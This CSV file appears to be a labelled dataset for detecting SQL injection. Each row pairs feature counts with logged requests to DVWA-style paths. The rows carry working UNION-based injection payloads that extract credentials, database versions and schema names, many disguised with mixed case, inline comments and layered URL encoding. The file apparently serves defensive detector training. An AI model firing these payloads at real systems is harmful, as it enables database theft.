url_length,path_length,query_length,body_length,is_json_payload,json_depth,param_count_body,number_of_parameters,parameter_name_count,encoded_character_count,percent_encoded_count,single_quote_count,double_quote_count,semicolon_count,comma_count,parenthesis_count,dash_count,hash_count,asterisk_count,slash_count,equal_count,plus_count,whitespace_count,keyword_select,keyword_union,keyword_from,keyword_where,keyword_or,keyword_and,keyword_insert,keyword_update,keyword_delete,keyword_drop,keyword_alter,keyword_create,keyword_table,keyword_information_schema,keyword_sleep,keyword_benchmark,keyword_version,has_union_select,has_tautology,has_sql_comment,has_quote,has_subquery,has_information_schema,has_sleep,has_benchmark,has_if_function,has_case_when,has_exists,has_substring,has_ascii,has_length,has_database_function,has_version_function,has_system_variable,has_error_based_pattern,has_error_condition,nested_select_count,sql_function_count,comparison_count,logical_operator_count,method_get,method_post,status_code,is_error_response,response_size,response_time,ip_request_count,ip_unique_path_count,ip_unique_query_count,text,ip,timestamp,method,url,path,query,decoded_query,attack_type,label,label_source,request_hash
131,22,108,0,0,0,0,0,0,10,10,1,0,0,1,0,0,1,0,3,1,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,0,1,0,200,0,1182,1,13115,10,6928,"id=1'%20UNION%20SELECT%20table_name,table_schema%20FROM%20information_schema.columns%20#",192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id%3D1%27%2520UNION%2520SELECT%2520table_name%2Ctable_schema%2520FROM%2520information_schema.columns%2520%23,/vulnerabilities/sqli/,id%3D1%27%2520UNION%2520SELECT%2520table_name%2Ctable_schema%2520FROM%2520information_schema.columns%2520%23,"id=1'%20UNION%20SELECT%20table_name,table_schema%20FROM%20information_schema.columns%20#",sqli_union,1,existing_log_label,71488a07d788431a4ed83840c070479a
10,10,0,82,0,0,1,0,0,0,0,1,0,0,2,0,0,1,0,1,1,0,9,1,1,1,0,0,0,0,0,0,0,0,0,0,1,0,0,0,1,0,1,1,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,0,0,1,200,0,4382,1,13115,10,6928,"id=' UNION SELECT 1,2, table_name FROM information_schema.tables #",192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/login.php,/login.php,,,sqli_union,1,existing_log_label,7ba57698d0475666078beff8240b0373
78,22,55,0,0,0,0,1,2,2,2,1,0,0,2,6,0,0,1,4,1,0,7,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,1,1,0,0,0,0,0,0,0,0,0,0,1,1,0,0,0,1,2,1,0,1,0,200,0,1029,1,13115,10,6928,"id=1' UNION SELECT user(), database(), version() /*",192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,"/vulnerabilities/sqli/?id=1%27+UNION SELECT user(),+database(),+version()+%2F*",/vulnerabilities/sqli/,"id=1%27+UNION SELECT user(),+database(),+version()+%2F*","id=1' UNION SELECT user(), database(), version() /*",sqli_union,1,existing_log_label,f13b240eb0315b3ebad950f84fa8cfbb
102,22,79,0,0,0,0,1,2,0,0,1,0,0,2,0,3,0,0,3,1,0,9,1,1,1,0,0,0,0,0,0,0,0,0,0,1,0,0,0,1,0,1,1,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,0,1,0,200,0,4392,0,13115,10,6928,"id=' UNION SELECT user,password, table_name FROM information_schema.tables -- -",192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,"/vulnerabilities/sqli/?id=' UNION SELECT user,password, table_name FROM information_schema.tables -- -",/vulnerabilities/sqli/,"id=' UNION SELECT user,password, table_name FROM information_schema.tables -- -","id=' UNION SELECT user,password, table_name FROM information_schema.tables -- -",sqli_union,1,existing_log_label,8b44a837ffd0033951293df22f93aefb
28,28,0,29,0,0,1,0,0,0,0,1,0,0,1,0,1,1,0,3,1,0,7,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,0,0,1,200,0,869,1,13115,10,6928,"id=-1' UNION ALL SELECT 1,2 #",192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/vulnerabilities/sqli_blind/,/vulnerabilities/sqli_blind/,,,sqli_union,1,existing_log_label,1dc1050b3b705fbfb3c66f99c6bd3f3c
72,22,49,0,0,0,0,0,0,8,8,1,0,0,1,0,0,1,0,3,1,0,5,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,0,1,0,200,0,1944,1,13115,10,6928,"id='	UniOn	sELEcT	user,password	#",192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id%3D%27%09UniOn%09sELEcT%09user%2Cpassword%09%23,/vulnerabilities/sqli/,id%3D%27%09UniOn%09sELEcT%09user%2Cpassword%09%23,"id='	UniOn	sELEcT	user,password	#",sqli_union,1,existing_log_label,bcc122200bcf27aca1ee07af1b5ec1e2
214,22,191,0,0,0,0,2,8,29,29,0,0,0,0,0,3,0,0,3,2,24,1,1,1,1,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,2,0,1,0,200,0,701,1,13115,10,6928,id=id%3D%27+++Union+++Select+++table_name%2Ctable_schema%2C+++table_name+++FROM+++information_schema.tables+++%3B--+++-&Submit=Submit,192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id=id%253D%2527%2B%2B%2BUnion%2B%2B%2BSelect%2B%2B%2Btable_name%252Ctable_schema%252C%2B%2B%2Btable_name%2B%2B%2BFROM%2B%2B%2Binformation_schema.tables%2B%2B%2B%253B--%2B%2B%2B-&Submit=Submit,/vulnerabilities/sqli/,id=id%253D%2527%2B%2B%2BUnion%2B%2B%2BSelect%2B%2B%2Btable_name%252Ctable_schema%252C%2B%2B%2Btable_name%2B%2B%2BFROM%2B%2B%2Binformation_schema.tables%2B%2B%2B%253B--%2B%2B%2B-&Submit=Submit,id=id%3D%27+++Union+++Select+++table_name%2Ctable_schema%2C+++table_name+++FROM+++information_schema.tables+++%3B--+++-&Submit=Submit,sqli_union,1,existing_log_label,d64aae6e250bf65cfa7f10baa3125231
22,22,0,83,0,0,1,0,0,0,0,1,0,0,2,0,0,0,1,4,1,0,9,1,1,1,0,0,0,0,0,0,0,0,0,0,1,0,0,0,1,0,1,1,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,0,0,1,200,0,1143,1,13115,10,6928,"id=' UNION select 1,2, table_name from information_schema.tables /*",192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/vulnerabilities/sqli/,/vulnerabilities/sqli/,,,sqli_union,1,existing_log_label,d864d80e71c4cb11e2a306ff8ae15162
55,22,32,0,0,0,0,0,0,1,1,1,0,0,1,0,3,0,0,3,1,0,6,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,0,1,0,200,0,3440,1,13115,10,6928,"id=-1' UNiON ALL SELECT 1,2 --",192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,"/vulnerabilities/sqli/?id%3D-1'+UNiON+ALL+SELECT+1,2+--",/vulnerabilities/sqli/,"id%3D-1'+UNiON+ALL+SELECT+1,2+--","id=-1' UNiON ALL SELECT 1,2 --",sqli_union,1,existing_log_label,9003443f4e32520a24dd184fdc99bbb5
68,22,44,0,0,0,0,0,0,1,1,1,0,0,1,2,0,0,0,3,1,0,6,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,0,1,0,200,0,1161,0,13115,10,6928,"id=1' UNION SELECT 1,version() FROM users",192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,"/vulnerabilities/sqli/?id%3D1'+UNION+SELECT+1,version()+FROM+users+#",/vulnerabilities/sqli/,"id%3D1'+UNION+SELECT+1,version()+FROM+users+","id=1' UNION SELECT 1,version() FROM users ",sqli_union,1,existing_log_label,df0018e0853cd36de2816614819ac78a
141,22,118,0,0,0,0,2,8,12,12,0,0,0,0,0,3,0,0,3,2,7,1,1,1,1,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,2,0,1,0,200,0,1383,1,13115,10,6928,id=id%3D1%27+Union+select+1%2Cversion%28%29+From+information_schema.columns+--+-&Submit=Submit,192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id=id%253D1%2527%2BUnion%2Bselect%2B1%252Cversion%2528%2529%2BFrom%2Binformation_schema.columns%2B--%2B-&Submit=Submit,/vulnerabilities/sqli/,id=id%253D1%2527%2BUnion%2Bselect%2B1%252Cversion%2528%2529%2BFrom%2Binformation_schema.columns%2B--%2B-&Submit=Submit,id=id%3D1%27+Union+select+1%2Cversion%28%29+From+information_schema.columns+--+-&Submit=Submit,sqli_union,1,existing_log_label,8651e4d9e3f339881b17207414818e33
134,22,111,0,0,0,0,0,0,12,12,1,0,0,2,0,2,0,0,3,1,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,0,1,0,200,0,4350,1,13115,10,6928,"id=1'%20UNION%20ALL%20SELECT%20null,%20table_name,table_schema%20FROM%20dvwa.users%20--",192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id%3D1%27%2520UNION%2520ALL%2520SELECT%2520null%2C%2520table_name%2Ctable_schema%2520FROM%2520dvwa.users%2520--,/vulnerabilities/sqli/,id%3D1%27%2520UNION%2520ALL%2520SELECT%2520null%2C%2520table_name%2Ctable_schema%2520FROM%2520dvwa.users%2520--,"id=1'%20UNION%20ALL%20SELECT%20null,%20table_name,table_schema%20FROM%20dvwa.users%20--",sqli_union,1,existing_log_label,3697c78059f6d7a2cbb9f90eb08d7e1f
10,10,0,89,0,0,1,0,0,0,0,1,0,0,2,0,0,0,1,2,1,0,9,1,1,1,0,0,0,0,0,0,0,0,0,0,1,0,0,0,1,0,1,1,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,0,0,1,200,0,3592,1,13115,10,6928,"id=' UNioN SELECT table_name,table_schema, table_name FROM information_schema.tables /*",192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/login.php,/login.php,,,sqli_union,1,existing_log_label,eaf3e044cf28f6c721d9810269ee7526
28,28,0,81,0,0,1,0,0,0,0,1,0,0,2,0,0,1,16,19,1,0,2,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,0,0,1,200,0,3741,1,13115,10,6928,"id=1'/**/Union/**/ALL/**/SELECT/**/null,/**/user,password/**/fROM/**/users/**/#",192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/vulnerabilities/sqli_blind/,/vulnerabilities/sqli_blind/,,,sqli_union,1,existing_log_label,7f37b304405eeba8797af0bd8e5b6f72
92,22,69,0,0,0,0,0,0,7,7,1,0,0,2,2,0,0,0,3,1,0,9,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,0,1,0,200,0,1659,1,13115,10,6928,"id=1' UNION ALL SELECT null, 1,version() FROM users %23",192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id%3D1%27+UNION+ALL+SELECT+null%2C+1%2Cversion%28%29+FROM+users+%2523,/vulnerabilities/sqli/,id%3D1%27+UNION+ALL+SELECT+null%2C+1%2Cversion%28%29+FROM+users+%2523,"id=1' UNION ALL SELECT null, 1,version() FROM users %23",sqli_union,1,existing_log_label,33a8ebb35eec36e503124582d228a6ef
165,22,142,0,0,0,0,2,8,13,13,0,0,0,0,0,0,0,0,3,2,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,2,0,1,0,200,0,3086,1,13115,10,6928,id=id%3D1%27%2520UNION%2520ALL%2520select%2520null%2C%2520user%2Cpassword%2520FROm%2520users%2520%2523&Submit=Submit,192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id=id%253D1%2527%252520UNION%252520ALL%252520select%252520null%252C%252520user%252Cpassword%252520FROm%252520users%252520%252523&Submit=Submit,/vulnerabilities/sqli/,id=id%253D1%2527%252520UNION%252520ALL%252520select%252520null%252C%252520user%252Cpassword%252520FROm%252520users%252520%252523&Submit=Submit,id=id%3D1%27%2520UNION%2520ALL%2520select%2520null%2C%2520user%2Cpassword%2520FROm%2520users%2520%2523&Submit=Submit,sqli_union,1,existing_log_label,6f7617261a666d3150afdab399bc80e3
163,22,140,0,0,0,0,2,8,18,18,0,0,0,0,0,0,0,0,3,2,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,2,0,1,0,200,0,1615,1,13115,10,6928,id=id%3D1%27%2BUnion%2Bselect%2Buser%28%29%2C%2Bdatabase%28%29%2C%2Bversion%28%29%2B%2F%2A&Submit=Submit,192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id=id%253D1%2527%252BUnion%252Bselect%252Buser%2528%2529%252C%252Bdatabase%2528%2529%252C%252Bversion%2528%2529%252B%252F%252A&Submit=Submit,/vulnerabilities/sqli/,id=id%253D1%2527%252BUnion%252Bselect%252Buser%2528%2529%252C%252Bdatabase%2528%2529%252C%252Bversion%2528%2529%252B%252F%252A&Submit=Submit,id=id%3D1%27%2BUnion%2Bselect%2Buser%28%29%2C%2Bdatabase%28%29%2C%2Bversion%28%29%2B%2F%2A&Submit=Submit,sqli_union,1,existing_log_label,0dd99690051980ca684da46135b7acb4
103,22,80,0,0,0,0,0,0,10,10,1,0,0,1,0,1,0,1,4,1,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,0,1,0,200,0,3711,1,13115,10,6928,"id=-1'%20UNION%20ALL%20SElEct%20table_name,table_schema%20/*",192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id%3D-1%27%2520UNION%2520ALL%2520SElEct%2520table_name%2Ctable_schema%2520%2F%2A,/vulnerabilities/sqli/,id%3D-1%27%2520UNION%2520ALL%2520SElEct%2520table_name%2Ctable_schema%2520%2F%2A,"id=-1'%20UNION%20ALL%20SElEct%20table_name,table_schema%20/*",sqli_union,1,existing_log_label,b95eb5cd1ee3c015fbd7c5c8bf1fbaca
113,22,90,0,0,0,0,1,2,0,0,1,0,1,2,0,3,0,0,3,1,0,10,1,1,1,0,0,0,0,0,0,0,0,0,0,1,0,0,0,1,0,1,1,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,0,1,0,200,0,1037,1,13115,10,6928,"id=1' union ALL Select null, table_name,table_schema fROM information_schema.columns ;-- -",192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,"/vulnerabilities/sqli/?id=1'+union+ALL+Select+null,+table_name,table_schema+fROM+information_schema.columns+;--+-",/vulnerabilities/sqli/,"id=1'+union+ALL+Select+null,+table_name,table_schema+fROM+information_schema.columns+;--+-","id=1' union ALL Select null, table_name,table_schema fROM information_schema.columns ;-- -",sqli_union,1,existing_log_label,404b41b77fb8c1299b6186c3a65acda0
157,22,134,0,0,0,0,2,8,13,13,0,0,0,0,0,0,0,0,3,2,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,2,0,1,0,200,0,4030,3,13115,10,6928,id=id%3D1%27%2BUNION%2BALL%2BseLECT%2Bnull%2C%2Bcolumn_name%2Cnull%2BFrom%2Bdvwa.users%2B%2523&Submit=Submit,192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id=id%253D1%2527%252BUNION%252BALL%252BseLECT%252Bnull%252C%252Bcolumn_name%252Cnull%252BFrom%252Bdvwa.users%252B%252523&Submit=Submit,/vulnerabilities/sqli/,id=id%253D1%2527%252BUNION%252BALL%252BseLECT%252Bnull%252C%252Bcolumn_name%252Cnull%252BFrom%252Bdvwa.users%252B%252523&Submit=Submit,id=id%3D1%27%2BUNION%2BALL%2BseLECT%2Bnull%2C%2Bcolumn_name%2Cnull%2BFrom%2Bdvwa.users%2B%2523&Submit=Submit,sqli_union,1,existing_log_label,239d64a28c6fa14237e0b3c105b8d4d8
75,22,52,0,0,0,0,0,0,2,2,1,0,0,1,0,1,1,0,3,1,0,12,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,0,1,0,200,0,2566,1,13115,10,6928,"id=-1'   UNION ALL   Select column_name,null   #",192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,"/vulnerabilities/sqli/?id%3D-1' ++UNION ALL ++Select column_name,null + %23",/vulnerabilities/sqli/,"id%3D-1' ++UNION ALL ++Select column_name,null + %23","id=-1'   UNION ALL   Select column_name,null   #",sqli_union,1,existing_log_label,30cf020e169412a61163c5d206ce59f8
110,22,87,0,0,0,0,1,2,0,0,1,0,0,2,0,0,0,1,4,1,0,9,1,1,1,0,0,0,0,0,0,0,0,0,0,1,0,0,0,1,0,1,1,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,0,1,0,200,0,3500,1,13115,10,6928,"id=1' Union ALL Select null, table_name,table_schema FrOM information_schema.columns /*",192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,"/vulnerabilities/sqli/?id=1' Union ALL Select null, table_name,table_schema FrOM information_schema.columns /*",/vulnerabilities/sqli/,"id=1' Union ALL Select null, table_name,table_schema FrOM information_schema.columns /*","id=1' Union ALL Select null, table_name,table_schema FrOM information_schema.columns /*",sqli_union,1,existing_log_label,ef4e589ffd16b5cf3c80b43282bc9448
22,22,0,103,0,0,1,0,0,0,0,1,0,1,1,0,4,0,12,15,1,0,2,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,0,0,1,200,0,891,1,13115,10,6928,"id=-1'/**/union/**/ALL/**/SELeCT/**/table_name,table_schema/**/;--/**/-",192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/vulnerabilities/sqli/,/vulnerabilities/sqli/,,,sqli_union,1,existing_log_label,4f0b9b5ce6a6a24fce4cdfcff70721e0
61,22,38,0,0,0,0,1,2,0,0,1,0,0,1,2,1,0,1,4,1,0,6,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,1,1,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,0,1,0,200,0,2102,1,13115,10,6928,"id=-1' UNION ALL SELECT 1,version() /*",192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,"/vulnerabilities/sqli/?id=-1' UNION ALL SELECT 1,version() /*",/vulnerabilities/sqli/,"id=-1' UNION ALL SELECT 1,version() /*","id=-1' UNION ALL SELECT 1,version() /*",sqli_union,1,existing_log_label,6951e19cbd65a329990a07336a7f09b0
163,22,140,0,0,0,0,1,2,23,23,1,0,1,2,0,3,0,16,19,1,0,1,1,1,1,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,1,1,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,0,1,0,200,0,4019,0,13115,10,6928,"id='/**/UNION/**/seLeCt/**/1,2,/**/table_name/**/from/**/information_schema.tables/**/;--/**/-",192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,"/vulnerabilities/sqli/?id=%27%2F%2A%2A%2FUNION%2F**/seLeCt%2F*%2A/1,2,/%2A*%2Ftable_name/*%2A%2Ffrom%2F%2A%2A%2Finformation_schema.tables%2F%2A%2A%2F;--%2F%2A*%2F-",/vulnerabilities/sqli/,"id=%27%2F%2A%2A%2FUNION%2F**/seLeCt%2F*%2A/1,2,/%2A*%2Ftable_name/*%2A%2Ffrom%2F%2A%2A%2Finformation_schema.tables%2F%2A%2A%2F;--%2F%2A*%2F-","id='/**/UNION/**/seLeCt/**/1,2,/**/table_name/**/from/**/information_schema.tables/**/;--/**/-",sqli_union,1,existing_log_label,7a1701242991d6916cea3239e2344bef
91,22,68,0,0,0,0,0,0,2,2,1,0,0,1,2,2,0,0,3,1,0,7,1,1,1,0,0,0,0,0,0,0,0,0,0,1,0,0,1,1,0,1,1,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,0,1,0,200,0,2241,1,13115,10,6928,"id=1' Union select 1,version() FROM information_schema.tables --",192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,"/vulnerabilities/sqli/?id%3D1%27+Union+select+1,version()+FROM+information_schema.tables+--",/vulnerabilities/sqli/,"id%3D1%27+Union+select+1,version()+FROM+information_schema.tables+--","id=1' Union select 1,version() FROM information_schema.tables --",sqli_union,1,existing_log_label,b41a3f84efa0ec2e91c215075d64e016
122,22,99,0,0,0,0,0,0,6,6,1,0,0,2,0,0,0,1,4,1,0,8,1,1,1,0,0,0,0,0,0,0,0,0,0,1,0,0,0,1,0,1,1,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,0,1,0,200,0,1737,1,13115,10,6928,"id=' Union Select table_name,table_schema, table_name fROM information_schema.tables /*",192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id%3D%27+Union+Select+table_name%2Ctable_schema%2C+table_name+fROM+information_schema.tables+%2F%2A,/vulnerabilities/sqli/,id%3D%27+Union+Select+table_name%2Ctable_schema%2C+table_name+fROM+information_schema.tables+%2F%2A,"id=' Union Select table_name,table_schema, table_name fROM information_schema.tables /*",sqli_union,1,existing_log_label,5ed60abe64822b76f18c51ef9255bab3
175,22,152,0,0,0,0,1,2,28,28,1,0,1,2,0,3,0,18,21,1,0,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,0,1,0,200,0,908,1,13115,10,6928,"id=1'/**/UNION/**/ALL/**/SELECT/**/null,/**/table_name,table_schema/**/FROM/**/users/**/;--/**/-",192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,"/vulnerabilities/sqli/?id=1'%2F%2A*%2FUNION%2F*%2A/ALL%2F%2A%2A%2FSELECT%2F*%2A%2Fnull,/%2A*%2Ftable_name,table_schema%2F*%2A%2FFROM%2F*%2A%2Fusers/%2A%2A%2F%3B--%2F%2A%2A%2F-",/vulnerabilities/sqli/,"id=1'%2F%2A*%2FUNION%2F*%2A/ALL%2F%2A%2A%2FSELECT%2F*%2A%2Fnull,/%2A*%2Ftable_name,table_schema%2F*%2A%2FFROM%2F*%2A%2Fusers/%2A%2A%2F%3B--%2F%2A%2A%2F-","id=1'/**/UNION/**/ALL/**/SELECT/**/null,/**/table_name,table_schema/**/FROM/**/users/**/;--/**/-",sqli_union,1,existing_log_label,38e518ee3197ecae05366b8dd1515697
113,22,90,0,0,0,0,1,2,0,0,1,0,1,2,0,3,0,0,3,1,0,9,1,1,1,0,0,0,0,0,0,0,0,0,0,1,0,0,0,1,0,1,1,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,0,1,0,200,0,2860,1,13115,10,6928,"id=' Union select table_name,table_schema, table_name fROM information_schema.tables ;-- -",192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,"/vulnerabilities/sqli/?id=' Union select table_name,table_schema, table_name fROM information_schema.tables ;-- -",/vulnerabilities/sqli/,"id=' Union select table_name,table_schema, table_name fROM information_schema.tables ;-- -","id=' Union select table_name,table_schema, table_name fROM information_schema.tables ;-- -",sqli_union,1,existing_log_label,a05898a49376c33eec77b85afef36dd7
95,22,72,0,0,0,0,0,0,11,11,1,0,0,2,6,0,1,0,3,1,0,7,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,1,1,0,0,0,0,0,0,0,0,0,0,1,1,0,0,0,1,2,1,0,1,0,200,0,2259,1,13115,10,6928,"id=1' union Select user(), database(), version() #",192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id%3D1%27+union+Select+user%28%29%2C+database%28%29%2C+version%28%29+%23,/vulnerabilities/sqli/,id%3D1%27+union+Select+user%28%29%2C+database%28%29%2C+version%28%29+%23,"id=1' union Select user(), database(), version() #",sqli_union,1,existing_log_label,34d93c3f994723905b65777ebc618246
100,22,77,0,0,0,0,0,0,1,1,1,0,0,2,2,2,0,0,3,1,0,8,1,1,1,0,0,0,0,0,0,0,0,0,0,1,0,0,1,1,0,1,1,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,0,1,0,200,0,2164,1,13115,10,6928,"id=' Union selecT 1,version(), table_name From information_schema.tables --",192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,"/vulnerabilities/sqli/?id%3D' Union selecT 1,version(),+table_name From+information_schema.tables+--",/vulnerabilities/sqli/,"id%3D' Union selecT 1,version(),+table_name From+information_schema.tables+--","id=' Union selecT 1,version(), table_name From information_schema.tables --",sqli_union,1,existing_log_label,d247993b60c09c9354eec8e729c3a22d
59,22,35,0,0,0,0,1,2,0,0,1,0,0,1,0,0,0,0,3,1,0,4,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,0,1,0,200,0,1664,1,13115,10,6928,"id=' UNION SELECT column_name,null",192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,"/vulnerabilities/sqli/?id=' UNION SELECT column_name,null #",/vulnerabilities/sqli/,"id=' UNION SELECT column_name,null ","id=' UNION SELECT column_name,null ",sqli_union,1,existing_log_label,53e0fe2d7d0739c51506fa7257d8a1be
201,22,178,0,0,0,0,2,8,27,27,0,0,0,0,0,1,0,0,3,2,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,2,0,1,0,200,0,1501,1,13115,10,6928,id=id%3D-1%27%2F%2A%2A%2FUNION%2F%2A%2A%2FALL%2F%2A%2A%2FSELECT%2F%2A%2A%2F1%2Cversion%28%29%2F%2A%2A%2F%2F%2A&Submit=Submit,192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id=id%253D-1%2527%252F%252A%252A%252FUNION%252F%252A%252A%252FALL%252F%252A%252A%252FSELECT%252F%252A%252A%252F1%252Cversion%2528%2529%252F%252A%252A%252F%252F%252A&Submit=Submit,/vulnerabilities/sqli/,id=id%253D-1%2527%252F%252A%252A%252FUNION%252F%252A%252A%252FALL%252F%252A%252A%252FSELECT%252F%252A%252A%252F1%252Cversion%2528%2529%252F%252A%252A%252F%252F%252A&Submit=Submit,id=id%3D-1%27%2F%2A%2A%2FUNION%2F%2A%2A%2FALL%2F%2A%2A%2FSELECT%2F%2A%2A%2F1%2Cversion%28%29%2F%2A%2A%2F%2F%2A&Submit=Submit,sqli_union,1,existing_log_label,1c8b0ba4e9f35b619cd6ab4810d0dbf8
